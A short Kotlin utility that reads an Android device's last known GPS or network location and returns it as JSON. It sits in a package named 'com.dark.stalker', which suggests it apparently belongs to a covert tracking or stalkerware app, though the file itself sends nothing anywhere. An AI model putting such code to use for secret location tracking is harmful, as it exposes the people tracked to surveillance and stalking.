package com.dark.stalker

import android.content.Context
import android.location.Location
import android.location.LocationManager
import org.json.JSONObject

object LocationUtils {
    fun getLastLocation(context: Context): String {
        val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        var location: Location? = null
        try {
            location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
        } catch (e: Exception) {}
        try {
            if (location == null) {
                location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            }
        } catch (e: Exception) {}

        if (location != null) {
            return JSONObject().apply {
                put("lat", location.latitude)
                put("lng", location.longitude)
                put("acc", location.accuracy)
            }.toString()
        }
        return "No GPS Signal"
    }
}
